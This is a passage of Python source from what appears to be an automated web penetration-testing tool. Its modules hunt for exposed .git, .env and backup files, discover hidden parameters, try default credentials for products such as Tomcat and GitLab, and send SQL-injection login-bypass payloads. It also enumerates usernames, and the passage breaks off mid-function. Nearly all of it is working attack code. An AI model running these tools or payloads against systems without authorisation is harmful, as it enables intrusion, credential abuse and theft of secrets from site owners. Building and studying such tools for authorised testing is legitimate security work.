_VCS_ARCH_EXTS = ["zip", "tar.gz", "tgz", "tar", "rar", "7z", "sql", "bak"]
_VCS_ARCH_SIG = {"zip": rb"^PK\x03\x04", "tar.gz": rb"^\x1f\x8b", "tgz": rb"^\x1f\x8b",
                 "tar": None, "rar": rb"^Rar!", "7z": rb"^7z\xbc\xaf",
                 "sql": rb"(?i)insert into|create table", "bak": None}
_VCS_HIGH_RE = re.compile(
    r"\.git|\.svn|\.hg|\.bzr|\.env|\.htpasswd|wp-config|web\.config|"
    r"\.sql$|\.(zip|tar\.gz|tgz|tar|rar|7z)$|"
    r"(\.php|\.py)(~|\.(bak|old|save|orig|swp))$|\.swp$", re.I)
_VCS_DEADLINE = 180
_VCS_THREADS = 20
_VCS_REQ_TIMEOUT = 5


def _vcs_derived(hostval: str) -> list:
    """(path, signature, high) probes derived from the target: source swap/bak files and
    archives named after the host's labels. Source swaps get a content signature (a leaked
    copy carries the source itself — <?php / python / KEY=), so they're confirmed with
    near-zero false positives instead of a fragile length diff."""
    cands = []
    for b in _VCS_SWAP_BASES:
        if b.endswith(".php"):
            sig, hi = rb"(?i)<\?php|<\?=", True
        elif b.endswith(".py"):
            sig, hi = rb"(?i)\b(import |from |def |class |SECRET_KEY|flask|django)\b", True
        elif b == ".env":
            sig, hi = rb"[A-Z0-9_]{2,}=", True
        else:
            sig, hi = None, False
        for form in _VCS_SWAP_FORMS:
            cands.append((form.format(b=b), sig, hi))
    parts = hostval.split(".")
    label = parts[0]
    apex = parts[-2] if len(parts) >= 2 and not hostval.replace(".", "").isdigit() else None
    bases = {label, apex, "backup", "www", "site", "web", "public_html"} - {None, ""}
    for base in sorted(bases):
        for ext in _VCS_ARCH_EXTS:
            cands.append((f"{base}.{ext}", _VCS_ARCH_SIG.get(ext), True))
    return cands


def _tool_vcs_hunt(ip: str, port: int, proto: str) -> str:
    """HTTP step-10 tool: hunt exposed VCS dirs, backups and config/secret files on the
    default host AND every discovered vhost (Host header, no /etc/hosts needed). Each hit is
    confirmed by a body signature where possible (magic bytes / content pattern) so a
    catch-all 200 can't cause a false positive. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_VCS_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_VCS_REQ_TIMEOUT)
            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            return resp.status, resp.read(8192)
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot hunt exposures")

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    targets = [ip] + [v for v in vhosts if v != ip]

    deadline = time.time() + _VCS_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    target_hits = {}

    def _rnd_path():
        return "/zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))

    def _soft404_match(status, blen, baselines):
        for bs, bl in baselines:
            if bs is not None and status == bs and abs(blen - bl) <= max(200, int(bl * 0.05)):
                return True
        return False

    for hostval in targets:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        baselines = []
        for _ in range(2):
            bs, bb = _probe(hostval, _rnd_path())
            baselines.append((bs, len(bb or b"")))
        candidates = [(f"/{p}", sig, hi) for p, sig, hi in _VCS_CHECKS] + \
                     [(f"/{p}", sig, hi) for p, sig, hi in _vcs_derived(hostval)]
        q = _queue.Queue()
        for c in candidates:
            q.put(c)
        hits, seen = [], set()
        hits_lock = threading.Lock()

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    path, sig, _hi = q.get_nowait()
                except _queue.Empty:
                    return
                status, body = _probe(hostval, path)
                with tested_lock:
                    tested[0] += 1
                ok, strong = False, False
                if status is not None and status != 404:
                    if sig is not None:
                        if re.search(sig, body or b""):
                            ok, strong = True, True          # signature confirms → certain
                    elif status in (200, 301, 302, 401, 403) and \
                            not _soft404_match(status, len(body or b""), baselines):
                        ok = True                            # no signature → soft-404 diff
                if ok:
                    with hits_lock:
                        if path not in seen:
                            seen.add(path)
                            hits.append(f"{'!' if strong else '+'} {status}  {path}")
                q.task_done()

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_VCS_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if hits:
            target_hits[hostval] = sorted(hits, key=lambda h: h.split()[-1])

    total = sum(len(v) for v in target_hits.values())
    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ VCS / backup / config hunt",
             f"targets: {len(targets)} ({', '.join([f'{ip} [default]'] + [v for v in targets if v != ip])})",
             f"tested {tested[0]} · hits {total} · {reason}",
             "(! = signature-confirmed · + = differs from soft-404)"]
    if target_hits:
        for hostval in targets:
            hh = target_hits.get(hostval)
            if not hh:
                continue
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            lines += [f"  {h}" for h in hh]
    else:
        lines.append("\nno exposed VCS / backups / config found")
    return "\n".join(lines)


# parameter-name wordlists, best first (multi-path entries merged); builtin fallback below.
_PARAM_WORDLISTS = [
    ("seclists burp-parameter-names", ["/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"]),
    ("arjun params", ["/usr/share/arjun/db/params.txt",
                      "/usr/lib/python3/dist-packages/arjun/db/large.txt"]),
    ("seclists raft-medium-words", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"]),
]
_PARAM_BUILTIN = [   # ~120 high-value parameter names
    "id", "page", "file", "path", "dir", "folder", "include", "inc", "template", "tpl",
    "doc", "document", "load", "read", "source", "src", "download", "url", "uri", "link",
    "redirect", "next", "return", "returnurl", "dest", "destination", "domain", "callback",
    "site", "feed", "host", "cmd", "exec", "command", "run", "ping", "system", "query",
    "q", "search", "s", "keyword", "user", "username", "uid", "userid", "account", "profile",
    "role", "admin", "debug", "test", "dev", "view", "action", "act", "do", "func", "module",
    "type", "cat", "category", "item", "product", "pid", "name", "email", "token", "key",
    "api_key", "apikey", "auth", "session", "lang", "language", "locale", "format", "output",
    "order", "sort", "field", "column", "table", "db", "data", "value", "val", "content",
    "text", "message", "msg", "code", "status", "state", "mode", "step", "start", "end",
    "limit", "offset", "count", "num", "size", "width", "height", "img", "image", "photo",
    "avatar", "upload", "filename", "filepath", "target", "ref", "referer", "from", "to",
    "date", "time", "year", "month", "day", "flag", "enable", "disable", "show", "hide",
]
_PARAM_DANGEROUS = {
    "file", "path", "dir", "folder", "include", "inc", "page", "template", "tpl", "doc",
    "document", "load", "read", "source", "src", "download", "url", "uri", "link",
    "redirect", "next", "return", "returnurl", "dest", "domain", "callback", "site", "feed",
    "host", "cmd", "exec", "command", "run", "ping", "system", "shell", "query", "id", "uid",
    "userid", "user", "account", "profile", "role", "admin", "debug", "view", "action",
    "do", "func", "module", "filepath", "filename", "target",
}
_PARAM_STATIC_RE = re.compile(
    r"\.(js|css|png|jpe?g|gif|ico|svg|woff2?|ttf|eot|pdf|zip|map|mp4|webp|json)(\?|$)", re.I)
_PARAM_DYNAMIC_RE = re.compile(r"\.(php|asp|aspx|jsp|jspx|cgi|pl|py|do|action)(\?|$)", re.I)
_PARAM_DEADLINE = 600
_PARAM_THREADS = 30
_PARAM_REQ_TIMEOUT = 5
_PARAM_MAX_ENDPOINTS = 12
_PARAM_MAX_WORDS = 5000


def _pick_param_wordlist() -> tuple:
    """Return (label, words) from the best available parameter-name wordlist, or builtin."""
    for label, paths in _PARAM_WORDLISTS:
        merged, seen = [], set()
        for path in paths:
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    for ln in fh:
                        w = ln.strip()
                        if w and not w.startswith("#") and w not in seen:
                            seen.add(w)
                            merged.append(w)
            except OSError:
                continue
        if merged:
            return f"{label} ({', '.join(paths)})", merged
    return f"builtin ({len(_PARAM_BUILTIN)} params)", list(_PARAM_BUILTIN)


def _is_dynamic_endpoint(path: str) -> bool:
    if _PARAM_STATIC_RE.search(path):
        return False
    if "?" in path:
        return True
    if _PARAM_DYNAMIC_RE.search(path):
        return True
    last = path.rstrip("/").split("/")[-1]
    return "." not in last                                    # extensionless → a route


def _gather_param_endpoints(ip: str, port: int, proto: str) -> list:
    """(hostval, path) dynamic endpoints mined from earlier tools' stored output — dir-brute
    hits (with their [host] attribution) and http-source ENDPOINTS. Falls back to '/' per
    host + a few common pages when nothing was recorded yet."""
    eps, seen = [], set()

    def _add(hostval, raw):
        raw = raw.split("#")[0]
        base = raw.split("?")[0]
        if not base.startswith("/"):
            m = re.match(r"https?://[^/]+(/\S*)", raw)         # full URL → take its path
            if not m:
                return
            base = m.group(1).split("?")[0]
        if not base or not _is_dynamic_endpoint(raw):
            return
        key = (hostval, base)
        if key not in seen:
            seen.add(key)
            eps.append((hostval, base))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "manual-paths"):
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp:
                    _add(host, mp.group(1))
        elif sid == "http-source":
            section = None
            for ln in output.splitlines():
                mh = re.match(r"^([A-Z][A-Z ]+) \(\d+\):", ln)
                if mh:
                    section = mh.group(1)
                    continue
                if section == "ENDPOINTS":
                    m = re.match(r"\s+(\S+)", ln)
                    if m:
                        _add(ip, m.group(1))

    if not eps:                                               # nothing mined yet → sensible defaults
        vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
        for h in [ip] + [v for v in vhosts if v != ip]:
            _add(h, "/")
        for p in ("/index.php", "/search.php", "/api", "/login.php"):
            _add(ip, p)
    return eps[:_PARAM_MAX_ENDPOINTS]


def _tool_param_hunt(ip: str, port: int, proto: str) -> str:
    """HTTP step-11 tool: hidden GET-parameter discovery on dynamic endpoints mined from
    earlier steps. A param is reported when its value reflects in the response (primary,
    near-zero FP) or when it materially changes a stable response vs a junk-param baseline.
    Endpoints that reflect any value, or whose response is unstable, fall back to reflection-
    only to keep precision. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _probe(hostval, path):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_PARAM_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_PARAM_REQ_TIMEOUT)
            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
            resp = conn.getresponse()
            body = resp.read(65536).decode("utf-8", "replace")
            return resp.status, body
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _probe(ip, "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot param-hunt")

    _wl_label, words = _pick_param_wordlist()
    words = words[:_PARAM_MAX_WORDS]
    endpoints = _gather_param_endpoints(ip, port, proto)
    canary = "pshx" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    deadline = time.time() + _PARAM_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    results = {}                                              # hostval -> {path: [params]}

    def _rnd():
        return "zz" + "".join(random.choices(string.ascii_lowercase, k=8))

    for hostval, path in endpoints:
        if time.time() >= deadline:
            stopped_deadline[0] = True
            break
        # baseline: two junk params → stability + does the app reflect any value?
        j1 = _probe(hostval, f"{path}?{_rnd()}={canary}")
        j2 = _probe(hostval, f"{path}?{_rnd()}={canary}")
        if j1[0] is None:
            continue
        b_status, b_body = j1
        b_len = len(b_body or "")
        reflect_trust = canary not in (b_body or "") and canary not in (j2[1] or "")
        stable = j2[0] == b_status and abs(len(j2[1] or "") - b_len) <= max(64, int(b_len * 0.03))

        q = _queue.Queue()
        for w in words:
            q.put(w)
        found, found_lock = [], threading.Lock()

        def _worker():
            while True:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                try:
                    param = q.get_nowait()
                except _queue.Empty:
                    return
                status, body = _probe(hostval, f"{path}?{param}={canary}")
                with tested_lock:
                    tested[0] += 1
                hit = False
                if status is not None:
                    if reflect_trust and body and canary in body:
                        hit = True                            # value reflected → param is processed
                    elif stable and (status != b_status or
                                     abs(len(body or "") - b_len) > max(64, int(b_len * 0.03))):
                        hit = True                            # stable endpoint reacted to this param
                if hit:
                    with found_lock:
                        if param not in found:
                            found.append(param)
                q.task_done()

        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_PARAM_THREADS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        if found:
            results.setdefault(hostval, {})[path] = sorted(found)

    total = sum(len(ps) for d in results.values() for ps in d.values())
    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ hidden parameter discovery",
             f"wordlist: {_wl_label}",
             f"endpoints: {len(endpoints)} · tested {tested[0]} · params {total} · {reason}"]
    if results:
        for hostval in dict.fromkeys(h for h, _p in endpoints):
            d = results.get(hostval)
            if not d:
                continue
            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
            for path in sorted(d):
                lines.append(f"  {path}?[{', '.join(d[path])}]")
    else:
        lines.append("\nno hidden parameters found")
    return "\n".join(lines)


# a SMALL curated set of product defaults — this is the default-creds check, NOT a
# brute-force (that is a separate, gated step). Kept short so it never trips a lockout.
_CREDS_DEFAULT = [
    ("admin", "admin"), ("admin", "password"), ("admin", ""), ("admin", "admin123"),
    ("admin", "changeme"), ("admin", "1234"), ("admin", "12345"), ("admin", "default"),
    ("administrator", "password"), ("administrator", "administrator"),
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", ""),
    ("user", "user"), ("test", "test"), ("guest", "guest"), ("guest", ""),
    ("sa", ""), ("operator", "operator"),
]
# product → (extra creds, extra login paths), matched against detected service/product/cpe
_CREDS_PRODUCT = {
    "tomcat":     ([("tomcat", "tomcat"), ("admin", "tomcat"), ("manager", "manager"),
                    ("tomcat", "s3cret")], ["/manager/html", "/host-manager/html"]),
    "jenkins":    ([("admin", "admin"), ("admin", "password")], ["/login"]),
    "grafana":    ([("admin", "admin")], ["/login"]),
    "phpmyadmin": ([("root", ""), ("root", "root"), ("root", "password")], ["/index.php"]),
    "gitlab":     ([("root", "5iveL!fe"), ("admin", "password")], ["/users/sign_in"]),
    "wordpress":  ([("admin", "admin"), ("admin", "password")], ["/wp-login.php"]),
    "kibana":     ([("elastic", "changeme")], ["/login"]),
    "zabbix":     ([("Admin", "zabbix")], ["/index.php"]),
}
_CREDS_PATH_RE = re.compile(
    r"admin|login|signin|sign-in|manager|portal|panel|console|auth|wp-login|phpmyadmin", re.I)
_CREDS_FALLBACK_PATHS = ["/admin", "/login", "/login.php", "/administrator", "/wp-login.php",
                         "/manager/html", "/phpmyadmin/", "/admin/login", "/user/login"]
_CREDS_ERR_RE = re.compile(
    r"invalid|incorrect|failed|wrong|denied|try again|bad (?:user|pass)|not (?:found|match)", re.I)
_CREDS_OK_RE = re.compile(
    r"logout|log out|sign out|dashboard|welcome|my account|successfully|control panel", re.I)
_CREDS_DEADLINE = 180
_CREDS_THREADS = 8
_CREDS_REQ_TIMEOUT = 5
_CREDS_MAX_TARGETS = 24


def _parse_login_form(html: str, page_path: str) -> "dict | None":
    """Pull the login <form> (the one with a password input): its action, method, the user
    and password field names, and any hidden fields (CSRF tokens) to echo back."""
    for form in re.findall(r"<form[^>]*>.*?</form>", html or "", re.I | re.S):
        if not re.search(r"type=[\"']?password", form, re.I):
            continue
        pm = re.search(r"<input[^>]*type=[\"']?password[\"']?[^>]*name=[\"']([^\"']+)", form, re.I) or \
            re.search(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']?password", form, re.I)
        if not pm:
            continue
        act = re.search(r"action=[\"']([^\"']*)[\"']", form, re.I)
        user_field, hidden = None, {}
        for tag in re.findall(r"<input[^>]*>", form, re.I):
            tp = re.search(r"type=[\"']?(\w+)", tag, re.I)
            tp = tp.group(1).lower() if tp else "text"
            nm = re.search(r"name=[\"']([^\"']+)", tag, re.I)
            if not nm:
                continue
            nm = nm.group(1)
            if tp == "password":
                continue
            if tp == "hidden":
                vv = re.search(r"value=[\"']([^\"']*)", tag, re.I)
                hidden[nm] = vv.group(1) if vv else ""
            elif user_field is None and (tp in ("text", "email") or
                                         re.search(r"user|email|login|name", nm, re.I)):
                user_field = nm
        if user_field:
            return {"action": act.group(1) if act else "", "user": user_field,
                    "pass": pm.group(1), "hidden": hidden}
    return None


def _gather_login_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path) login/admin surfaces — dir-brute paths that look like auth or returned
    401, plus product-specific and common fallback paths, on the host and every vhost."""
    tgts, seen = [], set()

    def _add(hostval, path):
        base = path.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        key = (hostval, base)
        if key not in seen:
            seen.add(key)
            tgts.append((hostval, base))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "manual-paths"):
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] (\d{3})\s+(\S+)", ln)
                if mp and (mp.group(1) == "401" or _CREDS_PATH_RE.search(mp.group(2))):
                    _add(host, mp.group(2))

    prod_paths = []
    prods = _creds_products(ip)
    for key in prods:
        prod_paths += _CREDS_PRODUCT[key][1]
    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in prod_paths + _CREDS_FALLBACK_PATHS:
            _add(h, p)
    return tgts[:_CREDS_MAX_TARGETS]


def _creds_products(ip: str) -> set:
    """Which _CREDS_PRODUCT keys match this host's detected services (name/product/cpe)."""
    blob = ""
    for (nm, prod, _ver, cpe) in fetch_services(ip).values():
        blob += " ".join(x for x in (nm, prod, cpe) if x).lower() + " "
    return {k for k in _CREDS_PRODUCT if k in blob}


def _tool_default_creds(ip: str, port: int, proto: str) -> str:
    """HTTP step-12 tool: try a small set of DEFAULT credentials (not a brute-force) against
    HTTP Basic realms and HTML login forms found on the host + vhosts. Basic is deterministic
    (wrong creds → 401); forms are judged against a wrong-creds failure baseline (redirect
    away / error text gone / session cookie). Low concurrency to avoid lockout. Dead → raises."""
    import http.client
    import ssl
    import time
    import base64
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_CREDS_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_CREDS_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(65536).decode("utf-8", "replace")
            setc = resp.headers.get_all("Set-Cookie") or []
            return (resp.status, data, setc, resp.headers.get("Location"),
                    resp.headers.get("WWW-Authenticate", "") or "")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None, ""
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test creds")

    base_creds = list(_CREDS_DEFAULT)
    for key in _creds_products(ip):
        for c in _CREDS_PRODUCT[key][0]:
            if c not in base_creds:
                base_creds.append(c)
    targets = _gather_login_targets(ip, port, proto)

    deadline = time.time() + _CREDS_DEADLINE
    tested = [0]
    tested_lock = threading.Lock()
    stopped_deadline = [False]
    surfaces = []
    valid = []
    lock = threading.Lock()

    def _cookie_names(setc):
        return {c.split("=", 1)[0].strip() for c in setc}

    def _attempt_form(hostval, path, u, p):
        gs, gbody, gsc, _gl, _gw = _req(hostval, "GET", path)
        if gs is None:
            return None
        form = _parse_login_form(gbody or "", path)
        if not form:
            return None
        data = dict(form["hidden"])
        data[form["user"]] = u
        data[form["pass"]] = p
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in gsc)
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if cookie:
            extra["Cookie"] = cookie
        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)

    def _form_ok(cur, base):
        if cur is None:
            return False
        st, body, sc, loc, _w = cur
        fs, fbody, fsc, _fl, _fw = base
        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
            return True
        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
            return True
        perr = bool(_CREDS_ERR_RE.search(body or ""))
        if bool(_CREDS_ERR_RE.search(fbody or "")) and not perr:
            return True
        new = _cookie_names(sc) - _cookie_names(fsc)
        if new and not perr and any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
            return True
        return False

    def _test_target(hostval, path):
        if time.time() >= deadline:
            stopped_deadline[0] = True
            return
        st, body, _sc, _loc, www = _req(hostval, "GET", path)
        if st is None:
            return
        if st == 401 and "basic" in www.lower():
            authtype = "Basic"
        elif st == 200 and re.search(r"type=[\"']?password", body or "", re.I) and \
                _parse_login_form(body or "", path):
            authtype = "form"
        else:
            return
        with lock:
            surfaces.append(f"{hostval}{path} ({authtype})")
        if authtype == "Basic":
            for u, p in base_creds:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                tok = base64.b64encode(f"{u}:{p}".encode()).decode()
                s2 = _req(hostval, "GET", path, extra={"Authorization": "Basic " + tok})[0]
                with tested_lock:
                    tested[0] += 1
                if s2 is not None and s2 != 401:
                    with lock:
                        valid.append(f"! {u}:{p or '<blank>'} @ {path} (Basic) [{hostval}]")
                    return                                    # one working cred is enough
        else:
            fbase = _attempt_form(hostval, path, "nulluser_zx9", "wrongpass_zx9")
            if fbase is None:
                return
            for u, p in base_creds:
                if time.time() >= deadline:
                    stopped_deadline[0] = True
                    return
                cur = _attempt_form(hostval, path, u, p)
                with tested_lock:
                    tested[0] += 1
                if _form_ok(cur, fbase):
                    with lock:
                        valid.append(f"! {u}:{p or '<blank>'} @ {path} (form) [{hostval}]")
                    return

    q = _queue.Queue()
    for t in targets:
        q.put(t)

    def _worker():
        while True:
            try:
                hostval, path = q.get_nowait()
            except _queue.Empty:
                return
            try:
                _test_target(hostval, path)
            finally:
                q.task_done()

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_CREDS_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    reason = "deadline" if stopped_deadline[0] else "complete"
    lines = [f"{scheme}://{ip}:{port}/ default credentials check",
             f"surfaces: {len(surfaces)} auth · tested {tested[0]} creds · valid {len(valid)} · {reason}"]
    if surfaces:
        lines.append("\nAUTH SURFACES:")
        lines += [f"  {s}" for s in sorted(set(surfaces))]
    if valid:
        lines.append("\nVALID:")
        lines += [f"  {v}" for v in sorted(set(valid))]
    else:
        lines.append("\nno default credentials worked")
    return "\n".join(lines)


# non-destructive SQLi auth-bypass payloads (login logic only — no DROP/DELETE): (user, pass)
_SQLI_BYPASS = [
    ("' OR '1'='1' -- -", ""), ("' OR 1=1 -- -", ""), ("' OR 1=1#", ""),
    ("admin' -- -", ""), ("admin'#", ""), ('" OR "1"="1" -- -', ""),
    ('") OR ("1"="1" -- -', ""), ("' OR 'x'='x", ""), ("' OR ''='", ""),
    ("admin", "' OR '1'='1"), ("admin", "' OR 1=1 -- -"),
]
_SQL_ERROR_RE = re.compile(
    r"you have an error in your sql syntax|warning:\s*mysqli?_|unclosed quotation mark|"
    r"quoted string not properly terminated|ORA-\d{5}|PostgreSQL.*?ERROR|SQLSTATE\[|"
    r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|System\.Data\.SqlClient|"
    r"ODBC SQL Server Driver|mysql_fetch|supplied argument is not a valid MySQL", re.I)
_AUTHB_DEADLINE = 180
_AUTHB_THREADS = 8
_AUTHB_REQ_TIMEOUT = 5
_AUTHB_MAX_TARGETS = 16


def _tool_auth_bypass(ip: str, port: int, proto: str) -> str:
    """HTTP step-13 tool: on HTML login forms (host + vhosts), try (A) SQLi auth-bypass
    payloads judged against a wrong-creds failure baseline, (B) a single-quote probe that
    surfaces DB error strings (injectable even without bypass), and (C) username enumeration
    by comparing a likely-valid user's failure response to consistent invalid ones. Payloads
    are non-destructive; low concurrency. Stdlib only; a dead server raises."""
    import http.client
    import ssl
    import time
    import random
    import string
    import urllib.parse
    import threading
    import queue as _queue

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_AUTHB_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_AUTHB_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(65536).decode("utf-8", "replace")
            return resp.status, data, (resp.headers.get_all("Set-Cookie") or []), resp.headers.get("Location")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test auth")

    def _submit(hostval, path, u, p):
        gs, gbody, gsc, _gl = _req(hostval, "GET", path)
        if gs is None:
            return None
        form = _parse_login_form(gbody or "", path)
        if not form:
            return None
        data = dict(form["hidden"])
        data[form["user"]] = u
        data[form["pass"]] = p
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in gsc)
        extra = {"Content-Type": "application/x-www-form-urlencoded"}
        if cookie:
            extra["Cookie"] = cookie
        return _req(hostval, "POST", apath, body=urllib.parse.urlencode(data), extra=extra)

    def _names(setc):
        return {c.split("=", 1)[0].strip() for c in setc}

    def _logged_in(cur, base):
        if cur is None or base is None:
            return False
        st, body, sc, loc = cur
        _fs, fbody, fsc, _fl = base
        if st in (301, 302, 303) and loc and not re.search(r"login|signin|sign-in|auth", loc, re.I):
            return True
        if _CREDS_OK_RE.search(body or "") and not _CREDS_OK_RE.search(fbody or ""):
            return True
        if bool(_CREDS_ERR_RE.search(fbody or "")) and not bool(_CREDS_ERR_RE.search(body or "")):
            return True
        new = _names(sc) - _names(fsc)
        if new and not _CREDS_ERR_RE.search(body or "") and \
                any(re.search(r"sess|sid|auth|logged|token", n, re.I) for n in new):
            return True
        return False

    def _sig(r):
        if r is None:
            return None
        st, body, _sc, _loc = r
        em = _CREDS_ERR_RE.search(body or "")
        return st, len(body or ""), (em.group(0).lower() if em else None)

    def _rnduser():
        return "nx" + "".join(random.choices(string.ascii_lowercase, k=8))

    targets = _gather_login_targets(ip, port, proto)[:_AUTHB_MAX_TARGETS]
    deadline = time.time() + _AUTHB_DEADLINE
    stopped_deadline = [False]
    forms_tested = [0]
    results = {}                                              # hostval -> [lines]
    lock = threading.Lock()

    def _test(hostval, path):
        if time.time() >= deadline:
            stopped_deadline[0] = True
            return
        gs, gbody, _sc, _l = _req(hostval, "GET", path)
        if gs is None or not _parse_login_form(gbody or "", path):
            return                                            # not a login form → skip
        with lock:
            forms_tested[0] += 1
        wrongpw = "Wp_" + "".join(random.choices(string.ascii_letters, k=8))
        fbase = _submit(hostval, path, _rnduser(), wrongpw)   # failure baseline (invalid creds)
        found = []
        # A) SQLi auth bypass
        for u, p in _SQLI_BYPASS:
            if time.time() >= deadline:
                stopped_deadline[0] = True
                break
            cur = _submit(hostval, path, u, p or "x")
            if _logged_in(cur, fbase):
                found.append(f"  ✗ BYPASS {path}  (payload: {u} / {p or 'x'})")
                break
        # B) DB error surfacing
        er = _submit(hostval, path, "admin'", "x")
        if er and er[1] and _SQL_ERROR_RE.search(er[1]):
            found.append(f"  ! SQLERROR {path}  (DB error reflected)")
        # C) username enumeration — invalids consistent, 'admin' differs
        inv1, inv2 = _sig(fbase), _sig(_submit(hostval, path, _rnduser(), wrongpw))
        adm = _sig(_submit(hostval, path, "admin", wrongpw))
